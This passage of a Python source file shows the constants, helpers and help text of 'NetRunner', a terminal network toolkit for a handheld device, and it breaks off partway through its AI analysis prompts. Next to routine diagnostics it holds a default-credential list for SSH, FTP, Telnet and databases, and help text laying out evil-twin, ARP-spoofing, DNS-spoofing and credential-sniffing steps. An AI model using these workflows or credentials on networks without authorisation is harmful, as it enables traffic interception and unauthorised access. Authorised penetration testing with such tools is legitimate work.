#!/usr/bin/env python3
"""
NetRunner v3.1 - Cyberpunk Network Toolkit
A TUI network testing tool for the Cyberboy handheld.

Keybindings:
  1-0,-,=,\\,`: Switch between 14 modules
  ←/→: Previous/Next tab
  ↑/↓: Navigate between fields
  PgUp/PgDn: Scroll results
  Tab: Next field
  Enter: Execute
  Esc: Cancel/Back
  ?: Help
  q: Quit
  r: Refresh
  s: Save results (text)
  j: Save results (JSON)
  m: Toggle sound effects
"""

import asyncio
import ipaddress
import json
import os
import random
import re
import socket
import ssl
import struct
import subprocess
import sys
import textwrap
from datetime import datetime
from pathlib import Path
from typing import Optional

from textual import on, work
from textual.app import App, ComposeResult
from textual.binding import Binding
from textual.containers import Container, Horizontal, Vertical, VerticalScroll
from textual.screen import ModalScreen
from textual.widgets import (
    Button,
    Collapsible,
    DataTable,
    Footer,
    Header,
    Input,
    Label,
    LoadingIndicator,
    ProgressBar,
    RichLog,
    Select,
    Sparkline,
    Static,
    Switch,
    TabbedContent,
    TabPane,
    TextArea,
)

# Optional imports
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from zeroconf import ServiceBrowser, Zeroconf, ServiceListener
    HAS_ZEROCONF = True
except ImportError:
    HAS_ZEROCONF = False

# Results directory
RESULTS_DIR = Path.home() / "netrunner-results"
RESULTS_DIR.mkdir(exist_ok=True)

# OUI database for MAC lookups (common vendors)
OUI_DATABASE = {
    "00:00:0C": "Cisco",
    "00:1A:2B": "Cisco",
    "00:50:56": "VMware",
    "00:0C:29": "VMware",
    "08:00:27": "VirtualBox",
    "52:54:00": "QEMU/KVM",
    "B8:27:EB": "Raspberry Pi",
    "DC:A6:32": "Raspberry Pi",
    "E4:5F:01": "Raspberry Pi",
    "D8:3A:DD": "Raspberry Pi",
    "2C:CF:67": "Raspberry Pi",
    "00:1B:21": "Intel",
    "00:1E:67": "Intel",
    "00:1F:3B": "Intel",
    "3C:97:0E": "Intel",
    "AC:DE:48": "Intel",
    "00:24:D7": "Intel",
    "00:26:C6": "Intel",
    "00:26:C7": "Intel",
    "A4:83:E7": "Apple",
    "00:1C:B3": "Apple",
    "00:1D:4F": "Apple",
    "00:1E:C2": "Apple",
    "00:25:BC": "Apple",
    "3C:15:C2": "Apple",
    "F4:5C:89": "Apple",
    "00:1A:11": "Google",
    "54:60:09": "Google",
    "F4:F5:D8": "Google",
    "94:EB:2C": "Google",
    "00:04:4B": "Nvidia",
    "00:0D:61": "Nvidia",
    "00:50:F2": "Microsoft",
    "00:15:5D": "Microsoft",
    "00:1D:D8": "Microsoft",
    "28:18:78": "Microsoft",
    "7C:1E:52": "Microsoft",
    "00:0E:C6": "Asix",
    "00:11:32": "Synology",
    "00:1E:06": "Netgear",
    "00:1F:33": "Netgear",
    "00:22:3F": "Netgear",
    "00:26:F2": "Netgear",
    "C0:3F:0E": "Netgear",
    "00:18:E7": "TP-Link",
    "00:1D:0F": "TP-Link",
    "14:CC:20": "TP-Link",
    "50:C7:BF": "TP-Link",
    "C0:25:E9": "TP-Link",
    "00:17:88": "Philips",
    "00:1C:DF": "Belkin",
    "00:1E:3A": "Nokia",
    "00:21:4C": "Samsung",
    "00:26:37": "Samsung",
    "5C:0A:5B": "Samsung",
    "00:24:E8": "Dell",
    "14:FE:B5": "Dell",
    "18:A9:05": "Hewlett-Packard",
    "00:1B:78": "Hewlett-Packard",
    "00:1E:0B": "Hewlett-Packard",
    "00:23:7D": "Hewlett-Packard",
    "00:1A:4B": "Hewlett-Packard",
    "54:EE:75": "Wistron",
    "00:E0:4C": "Realtek",
    "52:54:AB": "Realtek",
    "00:1F:1F": "Edimax",
    "00:0E:2E": "Edimax",
    "74:DA:38": "Edimax",
    "00:1C:10": "Cisco-Linksys",
    "00:1E:58": "D-Link",
    "00:22:B0": "D-Link",
    "00:26:5A": "D-Link",
    "1C:7E:E5": "D-Link",
    "28:10:7B": "D-Link",
}

# CVE Database for common services (version -> CVE list)
# Format: "service_pattern": [(version_max, severity, cve_id, description), ...]
CVE_DATABASE = {
    "openssh": [
        ("7.4", "HIGH", "CVE-2017-15906", "Improper access control in read-only mode"),
        ("7.2", "MEDIUM", "CVE-2016-10012", "Privilege escalation via shared memory"),
        ("6.9", "HIGH", "CVE-2015-6564", "Use-after-free privilege escalation"),
        ("6.6", "CRITICAL", "CVE-2014-1692", "Memory corruption in J-PAKE"),
        ("5.8", "HIGH", "CVE-2012-0814", "Auth bypass via crafted keys"),
    ],
    "apache": [
        ("2.4.49", "CRITICAL", "CVE-2021-41773", "Path traversal and RCE"),
        ("2.4.50", "CRITICAL", "CVE-2021-42013", "Path traversal bypass"),
        ("2.4.29", "MEDIUM", "CVE-2017-15715", "Filename bypass in FilesMatch"),
        ("2.4.25", "HIGH", "CVE-2017-3169", "mod_ssl null pointer dereference"),
        ("2.4.18", "MEDIUM", "CVE-2016-4979", "X509 client cert auth bypass"),
        ("2.2.31", "MEDIUM", "CVE-2016-0736", "Padding oracle in mod_session_crypto"),
    ],
    "nginx": [
        ("1.20.0", "MEDIUM", "CVE-2021-23017", "DNS resolver off-by-one heap write"),
        ("1.16.0", "MEDIUM", "CVE-2019-9511", "HTTP/2 DoS"),
        ("1.14.0", "MEDIUM", "CVE-2018-16845", "mp4 module DoS"),
        ("1.9.5", "HIGH", "CVE-2016-1247", "Privilege escalation via log files"),
    ],
    "vsftpd": [
        ("2.3.4", "CRITICAL", "CVE-2011-2523", "Backdoor command execution"),
        ("2.0.5", "MEDIUM", "CVE-2008-4307", "Denial of service"),
    ],
    "proftpd": [
        ("1.3.5", "CRITICAL", "CVE-2015-3306", "mod_copy arbitrary file copy"),
        ("1.3.3c", "HIGH", "CVE-2010-4221", "Telnet IAC buffer overflow"),
    ],
    "mysql": [
        ("5.7.28", "MEDIUM", "CVE-2019-2974", "Server optimizer DoS"),
        ("5.7.23", "HIGH", "CVE-2018-3133", "Protocol parser vulnerability"),
        ("5.6.40", "MEDIUM", "CVE-2018-2562", "Partition unspecified vulnerability"),
        ("5.5.59", "MEDIUM", "CVE-2018-2573", "GIS vulnerability"),
    ],
    "postgresql": [
        ("12.2", "HIGH", "CVE-2020-1720", "ALTER privilege escalation"),
        ("11.2", "MEDIUM", "CVE-2019-10130", "Selectivity estimation bypass"),
        ("10.4", "HIGH", "CVE-2018-1115", "Superuser SQL injection"),
    ],
    "samba": [
        ("4.10.0", "CRITICAL", "CVE-2017-7494", "Remote code execution (SambaCry)"),
        ("4.4.0", "HIGH", "CVE-2016-2118", "MITM attack (BADLOCK)"),
        ("3.6.3", "HIGH", "CVE-2012-1182", "RPC code generation buffer overflow"),
    ],
    "openssl": [
        ("1.0.1f", "CRITICAL", "CVE-2014-0160", "Heartbleed - memory disclosure"),
        ("1.0.1", "HIGH", "CVE-2014-0224", "ChangeCipherSpec MITM"),
        ("0.9.8za", "MEDIUM", "CVE-2014-3566", "POODLE SSLv3 vulnerability"),
    ],
    "php": [
        ("7.4.3", "HIGH", "CVE-2020-7059", "OOB read in mbstring"),
        ("7.3.11", "MEDIUM", "CVE-2019-11043", "PHP-FPM RCE"),
        ("7.2.19", "MEDIUM", "CVE-2019-11039", "Heap-based buffer over-read"),
        ("5.6.40", "HIGH", "CVE-2019-9024", "XMLRPC buffer over-read"),
    ],
    "redis": [
        ("6.0.8", "HIGH", "CVE-2021-32761", "Integer overflow in BITFIELD"),
        ("5.0.7", "MEDIUM", "CVE-2020-14147", "Heap buffer overflow in STRALGO"),
        ("4.0.10", "HIGH", "CVE-2018-12326", "Buffer overflow"),
    ],
    "mongodb": [
        ("4.0.0", "MEDIUM", "CVE-2019-2389", "Privilege escalation"),
        ("3.6.3", "HIGH", "CVE-2018-1049", "Race condition vulnerability"),
    ],
    "iis": [
        ("10.0", "HIGH", "CVE-2017-7269", "WebDAV buffer overflow"),
        ("7.5", "CRITICAL", "CVE-2015-1635", "HTTP.sys RCE"),
        ("6.0", "HIGH", "CVE-2017-7269", "WebDAV ScStoragePathFromUrl overflow"),
    ],
    "tomcat": [
        ("9.0.30", "HIGH", "CVE-2020-1938", "AJP Ghostcat file read/RCE"),
        ("8.5.50", "HIGH", "CVE-2020-1938", "AJP Ghostcat file read/RCE"),
        ("8.5.31", "MEDIUM", "CVE-2018-8014", "CORS bypass"),
        ("7.0.79", "HIGH", "CVE-2017-12617", "PUT method RCE"),
    ],
    "dovecot": [
        ("2.3.13", "MEDIUM", "CVE-2021-29157", "OAuth2 token validation"),
        ("2.3.10", "MEDIUM", "CVE-2020-12100", "Nested MIME DoS"),
        ("2.2.27", "HIGH", "CVE-2017-14461", "Out-of-bounds read"),
    ],
    "exim": [
        ("4.92.3", "CRITICAL", "CVE-2019-16928", "Heap-based buffer overflow RCE"),
        ("4.91", "CRITICAL", "CVE-2019-15846", "Remote command execution"),
        ("4.89", "CRITICAL", "CVE-2018-6789", "Base64 decode buffer overflow"),
    ],
    "sendmail": [
        ("8.14.7", "MEDIUM", "CVE-2014-3956", "Close-on-exec flag handling"),
        ("8.13.8", "HIGH", "CVE-2009-4565", "SSL cert validation bypass"),
    ],
    "bind": [
        ("9.16.0", "HIGH", "CVE-2020-8617", "TSIG validity check"),
        ("9.11.5", "HIGH", "CVE-2019-6465", "Zone transfer controls bypass"),
        ("9.10.8", "HIGH", "CVE-2018-5740", "Deny-answer-aliases DoS"),
    ],
}

# Default credentials database
DEFAULT_CREDS = {
    "ssh": [
        ("root", "root"), ("root", "toor"), ("root", "admin"), ("root", "password"),
        ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
        ("pi", "raspberry"), ("ubuntu", "ubuntu"), ("user", "user"),
    ],
    "ftp": [
        ("anonymous", ""), ("anonymous", "anonymous"), ("ftp", "ftp"),
        ("admin", "admin"), ("root", "root"), ("user", "user"),
    ],
    "telnet": [
        ("root", "root"), ("admin", "admin"), ("admin", "password"),
        ("root", ""), ("admin", "1234"), ("cisco", "cisco"),
    ],
    "mysql": [
        ("root", ""), ("root", "root"), ("root", "mysql"), ("root", "password"),
        ("admin", "admin"), ("mysql", "mysql"),
    ],
    "postgres": [
        ("postgres", "postgres"), ("postgres", ""), ("admin", "admin"),
    ],
    "redis": [
        ("", ""),  # No auth by default
    ],
    "mongodb": [
        ("", ""),  # No auth by default
        ("admin", "admin"), ("root", "root"),
    ],
}

# SSL/TLS vulnerability checks
SSL_VULNS = {
    "SSLv2": ("CRITICAL", "SSLv2 enabled - severely insecure, DROWN attack"),
    "SSLv3": ("HIGH", "SSLv3 enabled - vulnerable to POODLE"),
    "TLSv1.0": ("MEDIUM", "TLSv1.0 enabled - deprecated, consider disabling"),
    "TLSv1.1": ("LOW", "TLSv1.1 enabled - deprecated, should upgrade to TLS 1.2+"),
    "RC4": ("HIGH", "RC4 cipher in use - weak stream cipher"),
    "DES": ("HIGH", "DES/3DES cipher - weak block cipher"),
    "NULL": ("CRITICAL", "NULL cipher - no encryption"),
    "EXPORT": ("CRITICAL", "EXPORT cipher - FREAK/Logjam vulnerable"),
    "MD5": ("MEDIUM", "MD5 MAC - weak hash algorithm"),
}

# Hacker quotes for cyberpunk feel
HACKER_QUOTES = [
    "The Net is vast and infinite...",
    "I am the ghost in the machine.",
    "Information wants to be free.",
    "The street finds its own uses for things.",
    "We are all connected in the great machine.",
    "Hack the planet!",
    "There is no spoon.",
    "Stay frosty, netrunner.",
    "In cyberspace, no one can hear you scream.",
    "The future is already here.",
    "I see the code in the Matrix now.",
    "Access granted.",
    "Welcome to the grid.",
    "Your mind is software. Program it.",
    "Reality is just a simulation.",
    "The network is my home.",
    "Jacking in...",
    "Run silent, run deep.",
    "Trust no one, trust the code.",
    "The data must flow.",
]


def get_local_ip() -> str:
    """Get the local IP address."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "No connection"


def get_default_gateway() -> str:
    """Get the default gateway."""
    try:
        result = subprocess.run(
            ["ip", "route", "show", "default"],
            capture_output=True, text=True, timeout=5
        )
        match = re.search(r'default via (\S+)', result.stdout)
        return match.group(1) if match else "Unknown"
    except Exception:
        return "Unknown"


def get_network_cidr() -> str:
    """Get the local network in CIDR notation."""
    try:
        local_ip = get_local_ip()
        if local_ip == "No connection":
            return "192.168.1.0/24"
        parts = local_ip.split('.')
        return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
    except Exception:
        return "192.168.1.0/24"


def lookup_mac_vendor(mac: str) -> str:
    """Look up vendor from MAC address."""
    mac_clean = mac.upper().replace("-", ":").replace(".", ":")
    # Get first 3 octets
    prefix = ":".join(mac_clean.split(":")[:3])
    return OUI_DATABASE.get(prefix, "Unknown")


def parse_version(version_str: str) -> tuple:
    """Parse version string into comparable tuple."""
    # Extract version numbers from string like "7.4p1" or "2.4.49"
    match = re.search(r'(\d+(?:\.\d+)*)', version_str)
    if not match:
        return (0,)
    parts = match.group(1).split('.')
    return tuple(int(p) for p in parts)


def lookup_cves(service: str, version: str) -> list:
    """Look up CVEs for a service and version."""
    service_lower = service.lower()
    version_tuple = parse_version(version)

    results = []
    for svc_pattern, cves in CVE_DATABASE.items():
        if svc_pattern in service_lower:
            for vuln_version, severity, cve_id, description in cves:
                vuln_tuple = parse_version(vuln_version)
                # If the detected version is <= vulnerable version, it may be affected
                if version_tuple <= vuln_tuple:
                    results.append({
                        "cve": cve_id,
                        "severity": severity,
                        "description": description,
                        "affected_version": vuln_version,
                    })
    return results


def calculate_subnet(cidr: str) -> dict:
    """Calculate subnet information from CIDR notation."""
    try:
        network = ipaddress.ip_network(cidr, strict=False)
        return {
            "network": str(network.network_address),
            "netmask": str(network.netmask),
            "broadcast": str(network.broadcast_address),
            "first_host": str(network.network_address + 1),
            "last_host": str(network.broadcast_address - 1),
            "num_hosts": network.num_addresses - 2,
            "prefix_len": network.prefixlen,
            "wildcard": str(network.hostmask),
        }
    except Exception as e:
        return {"error": str(e)}


def create_wol_packet(mac: str) -> bytes:
    """Create a Wake-on-LAN magic packet."""
    mac_clean = mac.replace(":", "").replace("-", "").replace(".", "")
    if len(mac_clean) != 12:
        raise ValueError("Invalid MAC address")
    mac_bytes = bytes.fromhex(mac_clean)
    return b'\xff' * 6 + mac_bytes * 16


def play_beep(frequency: int = 1000, duration: int = 100) -> None:
    """Play a beep sound (non-blocking)."""
    try:
        # Use system beep via speaker-test or paplay
        subprocess.Popen(
            ["timeout", "0.1", "speaker-test", "-t", "sine", "-f", str(frequency), "-l", "1"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except Exception:
        pass  # Silently fail if no audio


# Output width for text wrapping (accounts for sidebar + padding)
OUTPUT_WIDTH = 58


def wrap_text(text: str, width: int = OUTPUT_WIDTH) -> str:
    """Wrap text to fit output window, preserving markup."""
    if not text:
        return text
    lines = []
    for line in text.split('\n'):
        if len(line) <= width:
            lines.append(line)
        else:
            # Wrap long lines, preserving leading whitespace
            indent = len(line) - len(line.lstrip())
            wrapped = textwrap.fill(
                line,
                width=width,
                initial_indent='',
                subsequent_indent=' ' * min(indent, 4),
                break_long_words=True,
                break_on_hyphens=False,
            )
            lines.append(wrapped)
    return '\n'.join(lines)


class WrappingRichLog(RichLog):
    """RichLog that automatically wraps text to fit the display."""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._raw_content: list[str] = []

    def write(self, content, *args, **kwargs):
        """Write content with automatic text wrapping."""
        # Store raw content for AI analysis
        if isinstance(content, str):
            self._raw_content.append(content)
            content = wrap_text(content)
        return super().write(content, *args, **kwargs)

    def clear(self) -> None:
        """Clear the log and raw content."""
        self._raw_content = []
        return super().clear()

    def get_text(self) -> str:
        """Get all raw text content for analysis."""
        return "\n".join(self._raw_content)


HELP_PAGES = {
    "keys": """[bold cyan]KEYBINDINGS[/bold cyan]

[yellow]1-0,-,=,\\[/yellow] Switch between 13 modules
[yellow]← / →[/yellow]   Previous / Next tab
[yellow]↑ / ↓[/yellow]   Navigate between fields
[yellow]PgUp/Dn[/yellow] Scroll results
[yellow]Tab[/yellow]     Move to next field
[yellow]Enter[/yellow]   Execute current action
[yellow]Esc[/yellow]     Cancel or go back
[yellow]?[/yellow]       Show this help screen
[yellow]q[/yellow]       Quit NetRunner
[yellow]r[/yellow]       Refresh current view
[yellow]s[/yellow]       Save results to text file
[yellow]a[/yellow]       AI analyze results (Ollama/Claude)
[yellow]A[/yellow]       AI settings (provider, model, install)
[yellow]j[/yellow]       Save results to JSON file
[yellow]m[/yellow]       Toggle sound effects

[bold cyan]QUICK REFERENCE[/bold cyan]

[yellow]Recon:[/yellow] Scanner → DNS/SSL → Geo → Security
[yellow]Monitor:[/yellow] WiFi → Monitor → Packets
[yellow]Attack:[/yellow] Scanner → RogueAP → Packets
[yellow]Debug:[/yellow] Ping → Trace → Speed → WiFi

[bold cyan]SAVING RESULTS[/bold cyan]

Location: ~/netrunner-results/
[s] Save as text | [j] Save as JSON""",

    "scanner": """[bold cyan][1] SCANNER[/bold cyan] - Network Discovery

Discover devices and scan ports using nmap.

[green]Input:[/green]
• Target - IP (192.168.1.1) or CIDR (/24)
• Ports - Optional (22,80,443)

[green]Scan Types:[/green]
• Ping Sweep - Find live hosts (ICMP)
• ARP Scan - Local network only, shows MACs
• TCP Top 100 - Common TCP ports
• UDP Top 20 - Common UDP (needs sudo)
• Services - Detect software versions

[green]Buttons:[/green]
• [Scan] - Run selected scan
• [Local] - Auto-detect & scan your network
• [Clear] - Clear results

[green]How to scan your network:[/green]
1. Press [Local] to auto-detect
2. ARP scan runs, shows devices
3. Pick an IP, select TCP Top 100
4. Press [Scan] to find open ports

[green]Colors:[/green] [green]Green[/green]=open [yellow]Yellow[/yellow]=filtered""",

    "dns": """[bold cyan][2] DNS/SSL[/bold cyan] - Domain Analysis

Query DNS records and check SSL certificates.

[green]Input:[/green] Domain name (example.com)
Do NOT include http:// or paths

[green]Record Types:[/green]
• A - IPv4 addresses
• AAAA - IPv6 addresses
• MX - Mail servers
• NS - Nameservers
• TXT - SPF, DKIM, verification
• CNAME - Aliases
• SOA - Authority record

[green]Buttons:[/green]
• [Lookup] - Query selected record type
• [WHOIS] - Registration info
• [SSL] - Certificate details
• [Clear] - Clear results

[green]SSL Output:[/green]
• Subject/Issuer, valid dates
• Days until expiration
• SANs (alternate names)
• Certificate chain""",

    "wifi": """[bold cyan][3] WiFi[/bold cyan] - Wireless Analysis

Analyze WiFi networks and monitor bandwidth.

[green]Buttons:[/green]
• [Scan] - List nearby networks
• [Info] - Current connection details
• [BW Mon] - Live bandwidth graph (toggle)
• [Channels] - Channel utilization
• [Signal] - Signal strength over time
• [Hidden] - Find hidden networks
• [Clear] - Stop & clear

[green]Scan Output:[/green]
SSID | Signal% | Security | Channel | Freq

[green]Signal Colors:[/green]
[green]>70%[/green] strong | [yellow]40-70%[/yellow] ok | [red]<40%[/red] weak

[green]Tips:[/green]
• Channels 1, 6, 11 don't overlap (2.4GHz)
• 5GHz has more channels
• BW Mon shows sparkline graph""",

    "ping": """[bold cyan][4] PING[/bold cyan] - Connectivity Testing

Test connectivity with ICMP ping and traceroute.

[green]Input:[/green]
• Target - IP or hostname
• Count - Number of pings (default: 5)

[green]Buttons:[/green]
• [Ping] - Send ICMP echo requests
• [Trace] - Traceroute to target
• [Stop] - Cancel operation

[green]Troubleshooting Steps:[/green]
1. Ping gateway (router) - local network
2. Ping 8.8.8.8 - internet connectivity
3. Ping google.com - DNS resolution
4. Traceroute - find where it fails

[green]Latency Colors:[/green]
[green]<50ms[/green] excellent
[yellow]50-100ms[/yellow] acceptable
[red]>100ms[/red] high latency

[green]Traceroute:[/green]
• Shows each hop to destination
• * * * = hop didn't respond""",

    "speed": """[bold cyan][5] SPEED[/bold cyan] - Internet Speed Test

Test download/upload speeds and latency.

[green]Servers:[/green] Tele2, Cloudflare, Hetzner

[green]Buttons:[/green]
• [Download] - Download speed (10MB file)
• [Upload] - Upload speed test
• [Full Test] - Both download + upload
• [Latency] - Ping multiple servers

[green]Output:[/green]
• Speed in Mbps
• Transfer time
• Progress during test

[green]Latency Test:[/green]
Pings servers in different regions
Shows min/avg/max to each

[green]Tips:[/green]
• Close other apps during test
• WiFi slower than ethernet
• Test at different times""",

    "monitor": """[bold cyan][6] MONITOR[/bold cyan] - Network Monitoring

Monitor connections, traffic, and processes.

[green]Buttons:[/green]
• [Conns] - Active TCP/UDP connections
• [Traffic] - Interface RX/TX stats
• [Ports] - Listening ports & services
• [VPN] - VPN/Tailscale status
• [Process] - Network per process
• [Talkers] - Top bandwidth users
• [Sockets] - Socket statistics

[green]Connection States:[/green]
[green]ESTABLISHED[/green] - Active connection
[yellow]LISTEN[/yellow] - Waiting for connections
TIME_WAIT - Closing
CLOSE_WAIT - Remote closed

[green]Investigate unknown connections:[/green]
1. [Conns] - see all connections
2. [Ports] - what's listening
3. [Process] - identify apps""",

    "tools": """[bold cyan][7] TOOLS[/bold cyan] - Network Utilities

Subnet calc, Wake-on-LAN, mDNS, and more.

[green]Input:[/green] CIDR, MAC, or hostname

[green]Buttons:[/green]
• [Subnet] - Calculate subnet info
  Enter: 192.168.1.0/24
• [WoL] - Wake-on-LAN packet
  Enter: AA:BB:CC:DD:EE:FF
• [mDNS] - Browse local services
• [ARP] - ARP cache table
• [Routes] - Routing table
• [Hosts] - /etc/hosts file
• [Ifaces] - Interface details

[green]Subnet Output:[/green]
Network, broadcast, netmask, host range,
number of hosts, wildcard mask

[green]Wake-on-LAN:[/green]
1. Device must support WoL
2. Enable in BIOS/UEFI
3. Same LAN or forwarded
4. Enter MAC, press [WoL]""",

    "geo": """[bold cyan][8] GEO[/bold cyan] - IP Geolocation

Lookup geographic location of IP addresses.

[green]Input:[/green] IP address (blank = your IP)

[green]Buttons:[/green]
• [Lookup] - Geolocate entered IP
• [My IP] - Lookup your public IP
• [Clear] - Clear results

[green]Output:[/green]
• Country, region, city
• Coordinates (lat/long)
• Timezone
• ISP, organization
• AS number

[green]Flags:[/green]
[yellow]Proxy/VPN[/yellow] - Using VPN detected
[yellow]Hosting[/yellow] - Datacenter IP
[yellow]Mobile[/yellow] - Mobile carrier

[green]Use cases:[/green]
• Identify attack origins
• Verify VPN is working
• Find server locations""",

    "http": """[bold cyan][9] HTTP[/bold cyan] - HTTP Request Testing

Send HTTP requests and analyze responses.

[green]Input:[/green]
• URL - https:// added if missing
• Method - GET, HEAD, POST

[green]Buttons:[/green]
• [Send] - Send request, show response
• [Headers] - Headers only (faster)
• [Redirects] - Trace redirect chain
• [Clear] - Clear results

[green]Output:[/green]
• Status code (200, 404, etc.)
• Response time (ms)
• Content size, download speed
• Remote IP address
• Response headers

[green]Status Codes:[/green]
[green]200[/green] OK | [yellow]301/302[/yellow] Redirect
[yellow]401[/yellow] Unauthorized | [yellow]403[/yellow] Forbidden
[red]404[/red] Not found | [red]500[/red] Server error""",

    "security": """[bold cyan][0] SECURITY[/bold cyan] - Security Analysis

Check HTTP headers, email security, banners.

[green]Input:[/green]
• Target - Hostname or URL
• Port - For banner grab (default: 22)

[green]Buttons:[/green]
• [HTTP Sec] - HTTP security headers
• [Email Sec] - SPF/DKIM/DMARC
• [Banner] - Grab service banner
• [Clear] - Clear results

[green]HTTP Security Headers:[/green]
• HSTS - Force HTTPS
• X-Frame-Options - Clickjacking
• CSP - Resource loading
• X-Content-Type-Options - MIME sniff
• X-XSS-Protection - XSS filter
• Referrer-Policy - Referrer info

[green]Email Security:[/green]
• SPF - Authorized senders
• DKIM - Signature verification
• DMARC - Failure policy

[green]Output:[/green] [green]Green[/green]=present [red]Red[/red]=missing""",

    "bluetooth": """[bold cyan][-] BLUETOOTH[/bold cyan] - Bluetooth Scanner

Scan for nearby Bluetooth devices.

[green]Buttons:[/green]
• [Scan] - Scan nearby (takes ~10s)
• [Paired] - List paired devices
• [Info] - Controller info
• [Clear] - Clear results

[green]Scan Output:[/green]
• Device MAC address
• Device name (if broadcast)
• Device type/class
• Signal strength (RSSI)

[green]Device Types:[/green]
Phone, Computer, Audio, Peripheral,
Wearable, Imaging

[green]Controller Info:[/green]
• Adapter MAC and name
• Power state
• Discoverable/Pairable state

[green]Tips:[/green]
• Some devices hide names
• RSSI closer to 0 = stronger""",

    "packets": """[bold cyan][=] PACKETS[/bold cyan] - Packet Capture

Capture packets with tcpdump. Requires sudo.

[green]Input:[/green]
• Iface - Interface (any, wlan0, eth0)
• Filter - tcpdump filter syntax
• Count - Packets to capture (0=unlimited)

[green]Buttons:[/green]
• [Capture] - Start capture
• [Stop] - Stop capture
• [Conns] - Summarize connections
• [Clear] - Clear results

[green]Filter Examples:[/green]
port 80        - HTTP
port 443       - HTTPS
host 10.0.0.1  - Specific host
icmp           - Ping packets
tcp/udp        - Protocol only
not port 22    - Exclude SSH

[green]Combine:[/green]
port 80 or port 443
host X and port 80

[green]Colors:[/green]
[green]HTTP[/green] [cyan]HTTPS[/cyan] [yellow]DNS[/yellow] [magenta]SSH[/magenta] [red]Telnet[/red]""",

    "rogueap": """[bold cyan][\\] ROGUE AP[/bold cyan] - Evil Twin / MITM
[bold red]FOR AUTHORIZED TESTING ONLY![/bold red]

[green]Input:[/green]
• SSID - Fake AP name (FreeWiFi)
• Password - Blank for open network
• Spoof target - IP for ARP spoof
• DNS redirect - Your IP for DNS spoof
• Interface - wlan0

[green]Buttons:[/green]
• [Start AP] - Create hotspot
• [Stop AP] - Shutdown hotspot
• [Clients] - Show connected victims
• [ARP Spoof] - Poison ARP caches
• [DNS Spoof] - Redirect all DNS
• [Capture] - Sniff credentials
• [Clear] - Stop all

[bold green]EVIL TWIN:[/bold green]
1. Set SSID: "FreeWiFi"
2. Leave password blank
3. [Start AP] → wait for victims
4. [Clients] → see connections
5. [Capture] → sniff traffic

[bold green]ARP SPOOF:[/bold green]
1. Join target's network
2. Find target IP (Scanner)
3. Enter in "Spoof target"
4. [ARP Spoof] → MITM active

[bold green]DNS SPOOF:[/bold green]
1. Set up web server
2. Enter your IP in DNS redirect
3. [DNS Spoof] → all domains→you""",

    "vuln": """[bold cyan][`] VULN[/bold cyan] - Vulnerability Scanner
[bold yellow]FOR AUTHORIZED TESTING ONLY![/bold yellow]

[green]Input:[/green]
• Target - IP or hostname
• Port - Service port (optional)
• Service/Version - e.g. "OpenSSH 7.4"

[green]Buttons:[/green]
• [CVE Lookup] - Search CVE database
• [SSL Scan] - Check SSL/TLS vulns
• [Defaults] - Test default credentials
• [Quick Scan] - Detect + CVE lookup
• [Clear] - Clear results

[bold cyan]CVE LOOKUP[/bold cyan]
Enter service/version like:
  OpenSSH 7.4
  Apache/2.4.29
  nginx 1.14.0
Shows matching CVEs with severity.

[bold cyan]SSL SCAN[/bold cyan]
Checks for:
• Weak protocols (SSLv2, SSLv3, TLS 1.0)
• Weak ciphers (RC4, DES, EXPORT, NULL)
• Certificate issues (expired, self-signed)
• Heartbleed, POODLE indicators

[bold cyan]DEFAULT CREDS[/bold cyan]
Tests common default logins:
• SSH, FTP, Telnet
• Redis (no-auth), MongoDB (no-auth)
• MySQL, PostgreSQL

[bold cyan]QUICK SCAN[/bold cyan]
1. Runs nmap service detection
2. Auto-looks up CVEs for each service
3. Shows summary of vulnerabilities

[green]Severity Colors:[/green]
[red]CRITICAL/HIGH[/red] [yellow]MEDIUM[/yellow] [cyan]LOW[/cyan]""",

    "ai": """[bold cyan][a/A] AI ANALYSIS[/bold cyan]
Analyze scan results with local or cloud AI.

[green]Keybindings:[/green]
[yellow]a[/yellow]   Analyze current results
[yellow]A[/yellow]   Open AI settings

[bold cyan]AI SETTINGS (Shift+A)[/bold cyan]
[yellow]1[/yellow]   Select Ollama (offline)
[yellow]2[/yellow]   Select Claude CLI (online)
[yellow]Tab[/yellow] Navigate to buttons
[yellow]Esc[/yellow] Close settings

[green]Providers:[/green]
• [cyan]Ollama[/cyan] - Fully offline, runs on device
  Speed: ~2-5 tokens/sec on Pi 5
  No internet required

• [cyan]Claude CLI[/cyan] - Cloud-based (Sonnet)
  Speed: Much faster
  Requires internet connection

[green]Ollama Models:[/green]
• phi3:mini (2.2GB) - Fast, good for analysis
• llama3.2:3b (2.0GB) - Meta's latest
• gemma2:2b (1.6GB) - Efficient
• tinyllama (637MB) - Smallest

[green]Usage:[/green]
1. Run any scan in a module
2. Press [yellow]a[/yellow] to analyze
3. AI provides module-specific insights
4. Press [yellow]Esc[/yellow] to close analysis

[green]Pull New Models:[/green]
In AI Settings, select a model and
click [Pull Model] to download it.

Config: ~/.config/netrunner/ai_config.json""",
}

# AI Analysis prompts for each module
AI_PROMPTS = {
    "tab-scanner": """Analyze this network scan data. Identify:
- Interesting or unusual hosts/services
- Potential security concerns (open ports that shouldn't be)
- Device types based on MAC vendors
- Network topology insights
Be concise and highlight actionable findings.""",

    "tab-dns": """Analyze these DNS/SSL results. Look for:
- Misconfigurations or security issues
- Certificate problems (expiry, weak ciphers, chain issues)
- DNS records that seem unusual
- Potential for DNS-based attacks
Summarize key findings.""",

    "tab-wifi": """Analyze this WiFi scan data. Identify:
- Networks with weak security (WEP, open, WPS enabled)
- Channel congestion issues
- Hidden networks or suspicious SSIDs
- Signal strength patterns
- Potential rogue access points
Highlight security concerns.""",

    "tab-ping": """Analyze this ping/traceroute data:
- Identify latency issues or packet loss
- Note any unusual routing paths
- Detect potential network bottlenecks
- Flag hosts that are unreachable
Summarize connectivity status.""",

    "tab-speed": """Analyze these speed test results:
- Compare against typical expectations
- Identify asymmetric issues (upload vs download)
- Note latency problems
- Suggest potential causes for poor performance
Keep analysis brief.""",

    "tab-monitor": """Analyze this network monitoring data. Look for:
- Unusual connections or traffic patterns
- Suspicious processes with network activity
- High bandwidth consumers
- Connections to unusual ports or IPs
